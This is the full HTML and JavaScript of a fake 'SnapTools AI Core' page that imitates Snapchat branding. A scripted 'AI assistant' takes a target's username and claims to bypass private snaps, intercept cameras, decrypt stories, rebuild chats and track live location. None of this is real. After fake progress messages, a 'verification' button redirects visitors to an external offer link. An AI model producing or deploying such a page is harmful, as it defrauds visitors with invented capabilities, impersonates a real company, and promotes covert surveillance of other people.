<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SnapAssist AI - Professional Control Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --snap-yellow: #FFFC00;
            --snap-deep: #0b0b0e;
            --panel-bg: #121218;
            --border-light: rgba(255, 252, 0, 0.15);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --font-main: 'Plus Jakarta Sans', sans-serif;
        }

        body.light-theme {
            --snap-deep: #f8fafc;
            --panel-bg: #ffffff;
            --border-light: rgba(11, 11, 14, 0.1);
            --text-main: #0b0b0e;
            --text-muted: #64748b;
        }

        body[lang="ar"] { --font-main: 'Cairo', sans-serif; }

        * {
            box-sizing: border-box;
            margin: 0; padding: 0;
            font-family: var(--font-main);
            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
        }

        body {
            background-color: var(--snap-deep);
            color: var(--text-main);
            height: 100vh; height: 100dvh;
            overflow: hidden; position: relative;
            display: flex; flex-direction: column;
        }

        body.rtl { direction: rtl; }

        /* الهيدر الاحترافي */
        .app-header {
            position: relative; z-index: 100;
            background: var(--panel-bg);
            border-bottom: 1px solid var(--border-light);
            padding: 14px 24px; display: flex; justify-content: space-between; align-items: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
        }

        .brand-zone { display: flex; align-items: center; gap: 10px; }
        .snap-logo-img { width: 28px; height: 28px; object-fit: contain; }
        .brand-title { font-size: 18px; font-weight: 800; letter-spacing: -0.5px; }
        .brand-title span { color: #cbd5e1; font-weight: 400; font-size: 13px; margin-left: 5px; }
        body.rtl .brand-title span { margin-right: 5px; margin-left: 0; }

        .ctrl-actions { display: flex; align-items: center; gap: 10px; }

        .circle-btn {
            width: 40px; height: 40px; background: rgba(255,255,255,0.03); 
            border: 1px solid var(--border-light); color: var(--text-main);
            border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 15px;
        }
        .circle-btn:hover { background: var(--snap-yellow); color: #000; border-color: var(--snap-yellow); }
        body.light-theme .circle-btn:hover { background: #000; color: #fff; border-color: #000; }

        /* القائمة الجانبية المتقدمة (3 شرطات) */
        .side-drawer {
            position: fixed; top: 0; right: -300px; width: 300px; height: 100%;
            background: var(--panel-bg); border-left: 1px solid var(--border-light);
            z-index: 1000; padding: 30px 24px; display: flex; flex-direction: column; gap: 20px;
            box-shadow: -10px 0 30px rgba(0,0,0,0.2); transition: right 0.3s ease;
        }
        body.rtl .side-drawer { right: auto; left: -300px; border-left: none; border-right: 1px solid var(--border-light); transition: left 0.3s ease; }
        .side-drawer.open { right: 0; }
        body.rtl .side-drawer.open { left: 0; }

        .drawer-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .drawer-header h3 { font-size: 16px; font-weight: 800; }
        
        .drawer-menu-item {
            display: flex; align-items: center; gap: 12px; padding: 14px;
            background: rgba(255,255,255,0.02); border: 1px solid var(--border-light);
            border-radius: 12px; text-decoration: none; color: var(--text-main); font-size: 13px; font-weight: 600;
        }
        .drawer-menu-item:hover { background: rgba(255,252,0,0.05); border-color: var(--snap-yellow); }
        .drawer-menu-item i { width: 20px; text-align: center; font-size: 15px; }

        .drawer-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 999; display: none;
        }

        /* مساحة المحادثة */
        .chat-space {
            flex: 1; display: flex; flex-direction: column;
            max-width: 800px; width: 100%; margin: 0 auto; padding: 24px; overflow: hidden;
        }

        .chat-timeline { flex: 1; overflow-y: auto; padding-drop: 10px; display: flex; flex-direction: column; gap: 24px; }
        .chat-timeline::-webkit-scrollbar { width: 4px; }
        .chat-timeline::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 10px; }

        /* فقاعات الحوار المحدثة */
        .msg-row { display: flex; width: 100%; gap: 12px; align-items: flex-start; animation: slideIn 0.3s ease-out; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .msg-row.user-side { flex-direction: row-reverse; }

        .avatar-container {
            width: 36px; height: 36px; border-radius: 50%; overflow: hidden; flex-shrink: 0;
            display: flex; align-items: center; justify-content: center; background: var(--snap-yellow);
        }
        .user-side .avatar-container { background: rgba(255,255,255,0.1); color: var(--text-main); border: 1px solid var(--border-light); }

        .msg-bubble {
            max-width: 75%; background: var(--panel-bg); border: 1px solid var(--border-light);
            border-radius: 4px 16px 16px 16px; padding: 14px 18px; font-size: 14px; line-height: 1.6;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05); color: var(--text-main);
        }
        body.rtl .msg-bubble { border-radius: 16px 4px 16px 16px; }
        .user-side .msg-bubble { border-radius: 16px 4px 16px 16px; background: rgba(255,255,255,0.02); }
        body.rtl .user-side .msg-bubble { border-radius: 16px 16px 4px 16px; }

        /* الكروت والشبكة الاستعراضية */
        .interactive-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 15px; width: 100%; }
        @media (max-width: 550px) { .interactive-grid { grid-template-columns: 1fr; } }

        .grid-choice-btn {
            position: relative; height: 95px; border-radius: 14px; border: 1px solid var(--border-light);
            background-size: cover; background-position: center; cursor: pointer; overflow: hidden;
            display: flex; align-items: center; padding: 0 16px; transition: all 0.25s ease;
        }
        .grid-choice-btn::before { content: ''; position: absolute; inset: 0; background: linear-gradient(90deg, rgba(18,18,24,0.95) 50%, rgba(18,18,24,0.3) 100%); z-index: 1; }
        body.rtl .grid-choice-btn::before { background: linear-gradient(-90deg, rgba(18,18,24,0.95) 50%, rgba(18,18,24,0.3) 100%); }
        body.light-theme .grid-choice-btn::before { background: linear-gradient(90deg, rgba(255,255,255,0.95) 50%, rgba(255,255,255,0.3) 100%); }
        body.light-theme.rtl .grid-choice-btn::before { background: linear-gradient(-90deg, rgba(255,255,255,0.95) 50%, rgba(255,255,255,0.3) 100%); }

        .btn-core { position: relative; z-index: 2; display: flex; align-items: center; gap: 12px; }
        .btn-core i { color: var(--snap-yellow); font-size: 16px; }
        body.light-theme .btn-core i { color: #000; }
        .btn-txt h4 { font-size: 13px; font-weight: 700; color: var(--text-main); }
        .btn-txt p { font-size: 11px; color: var(--text-muted); margin-top: 1px; }

        .grid-choice-btn:hover { border-color: var(--snap-yellow); transform: translateY(-2px); }
        body.light-theme .grid-choice-btn:hover { border-color: #000; }

        /* منطقة الإدخال */
        .input-container {
            background: var(--panel-bg); border: 1px solid var(--border-light); border-radius: 16px;
            padding: 6px 8px 6px 18px; display: flex; align-items: center; gap: 10px; margin-top: 10px;
        }
        body.rtl .input-container { padding: 6px 18px 6px 8px; }
        .input-container:focus-within { border-color: var(--snap-yellow); }
        body.light-theme .input-container:focus-within { border-color: #000; }

        .core-input { background: transparent; border: none; outline: none; color: var(--text-main); font-size: 14px; flex: 1; padding: 10px 0; }
        .send-btn {
            width: 40px; height: 40px; background: var(--snap-yellow); color: #000; border: none; border-radius: 12px;
            cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 14px;
        }
        body.light-theme .send-btn { background: #000; color: #fff; }
        .input-container.disabled { opacity: 0.3; pointer-events: none; }

        /* كرت الحماية النهائي */
        .lock-card { background: rgba(255,255,255,0.01); border: 1px solid var(--snap-yellow); border-radius: 16px; padding: 20px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 14px; margin-top: 12px; }
        body.light-theme .lock-card { border-color: #000; }
        .lock-title { font-size: 15px; font-weight: 800; }
        .lock-p { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
        .action-submit-btn { width: 100%; background: var(--snap-yellow); color: #000; border: none; padding: 12px; border-radius: 10px; font-size: 13px; font-weight: 700; cursor: pointer; }
        body.light-theme .action-submit-btn { background: #000; color: #fff; }

        /* مؤشر الانتظار */
        .typing-dots { display: flex; gap: 4px; padding: 4px 0; }
        .typing-dots span { width: 6px; height: 6px; background: var(--snap-yellow); border-radius: 50%; animation: pulse 1.4s infinite both; }
        body.light-theme .typing-dots span { background: #000; }
        .typing-dots span:nth-child(2) { animation-delay: .2s; }
        .typing-dots span:nth-child(3) { animation-delay: .4s; }
        @keyframes pulse { 0%, 100% { opacity: 0.2; transform: scale(0.8); } 50% { opacity: 1; transform: scale(1.1); } }

        .toast-banner { position: fixed; top: 16px; left: 50%; transform: translateX(-50%) translateY(-100px); background: #1f1212; color: #f87171; border: 1px solid rgba(248,113,113,0.2); padding: 10px 20px; border-radius: 10px; font-size: 13px; font-weight: 600; z-index: 2000; transition: transform 0.3s, opacity 0.3s; opacity: 0; }
        .toast-banner.visible { transform: translateX(-50%) translateY(0); opacity: 1; }
    </style>
</head>
<body>

    <div class="toast-banner" id="toastBox">
        <i class="fa-solid fa-circle-exclamation"></i> &nbsp; <span id="toastMsg">Error details</span>
    </div>

    <!-- هيدر التطبيق الاحترافي -->
    <header class="app-header">
        <div class="brand-zone">
            <!-- استخدام الصورة المطلوبة للوجو سناب شات الافتراضي -->
            <img src="snapchat-logo.png" alt="Snapchat" class="snap-logo-img" onerror="this.src='https://cdns.iconmonstr.com/wp-content/releases/preview/2016/240/iconmonstr-snapchat-1.png'">
            <div class="brand-title">SnapTools <span>AI Core</span></div>
        </div>
        <div class="ctrl-actions">
            <button class="circle-btn" onclick="switchTheme()"><i class="fa-solid fa-circle-half-stroke"></i></button>
            <button class="circle-btn" onclick="changeLang()"><i class="fa-solid fa-globe"></i></button>
            <!-- زر الـ 3 شرطات الشهير كقائمة خيارات مستقلة -->
            <button class="circle-btn" onclick="toggleMenu(true)"><i class="fa-solid fa-bars"></i></button>
        </div>
    </header>

    <div class="drawer-overlay" id="overlay" onclick="toggleMenu(false)"></div>

    <!-- القائمة الجانبية المستقلة -->
    <div class="side-drawer" id="sideDrawer">
        <div class="drawer-header">
            <h3>Options & Support</h3>
            <button class="circle-btn" style="width:32px; height:32px;" onclick="toggleMenu(false)"><i class="fa-solid fa-xmark"></i></button>
        </div>
        <a href="https://accounts.google.com" target="_blank" class="drawer-menu-item">
            <i class="fa-brands fa-google" style="color: #4285F4;"></i>
            <span>Link Google Account</span>
        </a>
        <a href="https://support.snapchat.com" target="_blank" class="drawer-menu-item">
            <i class="fa-solid fa-circle-question"></i>
            <span>Official Help Center</span>
        </a>
        <a href="https://www.snapchat.com" target="_blank" class="drawer-menu-item">
            <i class="fa-brands fa-snapchat"></i>
            <span>Open Snapchat App</span>
        </a>
    </div>

    <!-- مساحة الشات المباشر -->
    <main class="chat-space">
        <div class="chat-timeline" id="chatTimeline"></div>

        <div class="input-container" id="inputBox">
            <input type="text" class="core-input" id="mainInput" placeholder="..." autocomplete="off">
            <button class="send-btn" onclick="submitInput()">
                <i class="fa-solid fa-arrow-up"></i>
            </button>
        </div>
    </main>

    <script>
        const langs = {
            en: {
                rtl: false, placeholderUser: "Type the exact Snapchat username...", placeholderNext: "Please click on a feature above...",
                errEmpty: "The field cannot be empty. Please type a valid username.",
                welcome: "Welcome to <strong>SnapTools Automated AI Core</strong>. To initiate a dynamic server search, please write the exact <strong>Snapchat username</strong> of the profile you wish to audit in the input field below.",
                selectMod: "Profile node found for <strong>@{user}</strong>. The system has analyzed the cloud index. To keep this process perfectly clear and simple, please <strong>select one specific feature</strong> below that you would like to inspect regarding this person:",
                f1: "Bypass Private Snaps", f1s: "Extract recent snaps logs",
                f2: "Intercept Snap Camera", f2s: "Access active camera feeds",
                f3: "View Friends List", f3s: "Fetch full linked friend data",
                f4: "Decrypt Private Stories", f4s: "Decrypt private custom stories",
                f5: "Reconstruct Chat History", f5s: "Download end-to-end conversations",
                f6: "Map Live Location", f6s: "Track dynamic live map coordinates",
                loadingText: "Synchronizing secure pathways for <strong>{mod}</strong>. Extracting cloud caches safely...",
                success: "Data stream ready! To protect our server interface from automated blocklists, you must perform the final security verification step to view the panel.",
                lockT: "Security Verification Active", lockD: "All requested parameters and media files are packaged inside an encrypted dashboard. Please complete one verification requirement below to grant system decryption.",
                lockB: "Reveal Extracted Dashboard"
            },
            ar: {
                rtl: true, placeholderUser: "اكتب اسم مستخدم حساب السناب شات المطلوب...", placeholderNext: "يرجى الضغط على إحدى الميزات أعلاه المتاحة...",
                errEmpty: "لا يمكن ترك الحقل فارغاً. يرجى كتابة اسم مستخدم صحيح.",
                welcome: "مرحباً بك في <strong>نظام المساعد الذكي المطور SnapTools</strong>. لمباشرة فحص قواعد البيانات السحابية، يرجى كتابة <strong>اسم المستخدم (Username)</strong> بدقة للحساب المراد فحصه في الخانة أسفله.",
                selectMod: "تم العثور على عقدة الحساب لـ <strong>@{user}</strong> بنجاح. لجعل العملية واضحة ومفهومة بالكامل، يرجى الآن <strong>اختيار ميزة واحدة محددة</strong> من الخيارات أدناه التي تود استخراجها ومعرفتها حول هذا الشخص:",
                f1: "تخطي اللقطات الخاصة (Snaps)", f1s: "استخراج سجل اللقطات الأخيرة المتبادلة",
                f2: "اعتراض بث الكاميرا", f2s: "الوصول إلى لقطات الكاميرا النشطة",
                f3: "عرض قائمة الأصدقاء", f3s: "جلب قائمة الأصدقاء والجهات المتصلة",
                f4: "فك تشفير القصص الخاصة", f4s: "عرض القصص المخصصة المخفية عن العامة",
                f5: "إعادة بناء سجل الدردشة", f5s: "تحميل المحادثات النصية المشفرة",
                f6: "رسم خريطة الموقع المباشر", f6s: "تتبع إحداثيات وموقع الخريطة بدقة",
                loadingText: "جاري مزامنة المسارات الآمنة لـ <strong>{mod}</strong>. يتم الآن سحب الملفات وحزم البيانات المشفرة...",
                success: "تدفق البيانات جاهز بالكامل! لحماية خوادم النظام من الحظر والتصنيف التلقائي، يرجى إجراء خطوة التحقق الأمني الأخيرة لعرض البيانات التفاعلية.",
                lockT: "مطلوب تأكيد الهوية البشرية", lockD: "تم تجميع كافة السجلات، الصور، والإحداثيات المطلوبة داخل لوحة تحكم مشفرة وآمنة. يرجى إكمال أحد المتطلبات أدناه لفك التشفير فوراً والبدء في العرض.",
                lockB: "فتح لوحة البيانات المستخرجة الآن"
            }
        };

        let currentLang = 'en';
        let currentStep = 'USER_STAGE'; // USER_STAGE -> MOD_STAGE -> LOAD_STAGE -> END_STAGE
        let trackedAccount = '';

        const timeline = document.getElementById('chatTimeline');
        const mainInput = document.getElementById('mainInput');
        const inputBox = document.getElementById('inputBox');

        function switchTheme() { document.body.classList.toggle('light-theme'); }
        function changeLang() { setLanguage(currentLang === 'en' ? 'ar' : 'en'); }
        function toggleMenu(show) {
            document.getElementById('sideDrawer').classList.toggle('open', show);
            document.getElementById('overlay').style.display = show ? 'block' : 'none';
        }

        function setLanguage(lang) {
            currentLang = lang;
            const config = langs[lang];
            document.body.setAttribute('lang', lang);
            if(config.rtl) document.body.classList.add('rtl'); else document.body.classList.remove('rtl');
            mainInput.placeholder = (currentStep === 'USER_STAGE') ? config.placeholderUser : config.placeholderNext;
            if(timeline.children.length === 0) displayAIMessage(config.welcome);
        }

        function displayAIMessage(htmlContent, onComplete = null) {
            const typingRow = document.createElement('div'); typingRow.className = 'msg-row';
            // صورة لوغو سناب شات مع اسم الملف snapchat-logo.png
            typingRow.innerHTML = `<div class="avatar-container"><img src="snapchat-logo.png" alt="Snap" class="snap-logo-img" onerror="this.src='https://cdns.iconmonstr.com/wp-content/releases/preview/2016/240/iconmonstr-snapchat-1.png'"></div><div class="msg-bubble"><div class="typing-dots"><span></span><span></span><span></span></div></div>`;
            timeline.appendChild(typingRow); timeline.scrollTop = timeline.scrollHeight;

            setTimeout(() => {
                typingRow.remove();
                const actualRow = document.createElement('div'); actualRow.className = 'msg-row';
                actualRow.innerHTML = `<div class="avatar-container"><img src="snapchat-logo.png" alt="Snap" class="snap-logo-img" onerror="this.src='https://cdns.iconmonstr.com/wp-content/releases/preview/2016/240/iconmonstr-snapchat-1.png'"></div><div class="msg-bubble">${htmlContent}</div>`;
                timeline.appendChild(actualRow); timeline.scrollTop = timeline.scrollHeight;
                if(onComplete) onComplete();
            }, 900);
        }

        function displayUserMessage(text) {
            const row = document.createElement('div'); row.className = 'msg-row user-side';
            row.innerHTML = `<div class="avatar-container"><i class="fa-solid fa-user" style="font-size:13px;"></i></div><div class="msg-bubble">${text}</div>`;
            timeline.appendChild(row); timeline.scrollTop = timeline.scrollHeight;
        }

        function submitInput() {
            const entry = mainInput.value.trim();
            if(entry === "") {
                const box = document.getElementById('toastBox');
                document.getElementById('toastMsg').innerText = langs[currentLang].errEmpty;
                box.classList.add('visible'); setTimeout(() => box.classList.remove('visible'), 3000);
                return;
            }

            if(currentStep === 'USER_STAGE') {
                trackedAccount = entry; mainInput.value = '';
                displayUserMessage(`@${trackedAccount}`);
                currentStep = 'MOD_STAGE'; inputBox.classList.add('disabled');
                mainInput.placeholder = langs[currentLang].placeholderNext;

                setTimeout(() => {
                    const cfg = langs[currentLang];
                    const outMsg = cfg.selectMod.replace('{user}', trackedAccount);
                    displayAIMessage(outMsg, () => {
                        const targetBubble = timeline.lastElementChild.querySelector('.msg-bubble');
                        const menuGrid = document.createElement('div'); menuGrid.className = 'interactive-grid';
                        // جلب مصفوفة الخيارات مع التصاور والأسماء الأصلية
                        menuGrid.innerHTML = `
                            <button class="grid-choice-btn" style="background-image: url('Snaping.jpg');" onclick="executeExtraction('f1')"><div class="btn-core"><i class="fa-solid fa-bolt"></i><div class="btn-txt"><h4>${cfg.f1}</h4><p>${cfg.f1s}</p></div></div></button>
                            <button class="grid-choice-btn" style="background-image: url('Camera.JPG');" onclick="executeExtraction('f2')"><div class="btn-core"><i class="fa-solid fa-camera"></i><div class="btn-txt"><h4>${cfg.f2}</h4><p>${cfg.f2s}</p></div></div></button>
                            <button class="grid-choice-btn" style="background-image: url('friends.jpg');" onclick="executeExtraction('f3')"><div class="btn-core"><i class="fa-solid fa-user-group"></i><div class="btn-txt"><h4>${cfg.f3}</h4><p>${cfg.f3s}</p></div></div></button>
                            <button class="grid-choice-btn" style="background-image: url('eyes.jpg');" onclick="executeExtraction('f4')"><div class="btn-core"><i class="fa-solid fa-eye-slash"></i><div class="btn-txt"><h4>${cfg.f4}</h4><p>${cfg.f4s}</p></div></div></button>
                            <button class="grid-choice-btn" style="background-image: url('chat.jpg');" onclick="executeExtraction('f5')"><div class="btn-core"><i class="fa-solid fa-comment"></i><div class="btn-txt"><h4>${cfg.f5}</h4><p>${cfg.f5s}</p></div></div></button>
                            <button class="grid-choice-btn" style="background-image: url('location.jpg');" onclick="executeExtraction('f6')"><div class="btn-core"><i class="fa-solid fa-map-location-dot"></i><div class="btn-txt"><h4>${cfg.f6}</h4><p>${cfg.f6s}</p></div></div></button>
                        `;
                        targetBubble.appendChild(menuGrid); timeline.scrollTop = timeline.scrollHeight;
                    });
                }, 400);
            }
        }

        mainInput.addEventListener('keydown', (e) => { if(e.key === 'Enter') submitInput(); });

        function executeExtraction(key) {
            currentStep = 'LOAD_STAGE';
            const cfg = langs[currentLang];
            displayUserMessage(cfg[key]);

            setTimeout(() => {
                const processHTML = `
                    <div>${cfg.loadingText.replace('{mod}', cfg[key])}</div>
                    <div style="margin-top:10px; font-size:12px; color:var(--snap-yellow); font-weight:700;">[+++++ SYNCING DATA PACKETS +++++]</div>
                `;
                displayAIMessage(processHTML, () => {
                    setTimeout(() => {
                        currentStep = 'END_STAGE';
                        const lockedPanelHTML = `
                            <div>${cfg.success}</div>
                            <div class="lock-card">
                                <div class="lock-title"><i class="fa-solid fa-lock" style="color:var(--snap-yellow)"></i> &nbsp; ${cfg.lockT}</div>
                                <div class="lock-p">${cfg.lockD}</div>
                                <button class="action-submit-btn" onclick="gateway()">${cfg.lockB}</button>
                            </div>
                        `;
                        displayAIMessage(lockedPanelHTML);
                    }, 2500);
                });
            }, 400);
        }

        function gateway() { window.location.href = "https://appsave.online/cl/i/j7nvnv"; }
        window.onload = () => { setLanguage('en'); };
    </script>
